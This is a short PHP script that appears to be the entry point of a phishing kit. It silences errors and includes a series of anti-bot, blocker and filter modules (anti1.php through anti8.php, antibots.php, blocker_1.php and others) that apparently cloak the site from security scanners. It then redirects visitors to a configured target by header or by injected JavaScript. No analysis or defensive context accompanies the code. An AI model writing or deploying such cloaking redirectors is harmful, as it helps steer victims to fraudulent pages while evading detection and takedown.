<?php

error_reporting(0);

include('blocker.php');
include('config.php');
include('anti1.php');
include('anti2.php');
include('anti3.php');
include('anti4.php');
include('anti5.php');
include('anti6.php');
include('anti7.php');
include('anti8.php');
include('antibots.php');
include('blocker_1.php');
include('blocker_2.php');
include('blocker_3.php');
include('blocker_4.php');
include('filter.php');




preg_match("/[^\/]+$/", urldecode($_SERVER["REQUEST_URI"]), $matches);
$data = $matches[0];

function begnWith($str, $begnString) {
    $len = strlen($begnString);
    return (substr($str, 0, $len) === $begnString);
}

if (begnWith($data, "?")) {
    $data = ltrim($data, '?');
}

if ($redirecttype == 1 || $redirecttype == '1') {
    header("Location: " . $redirectTo);
} else {
    echo "<script type=\"text/javascript\">window.location.href = \"$redirectTo\"</script>\n";
}
die();
?>
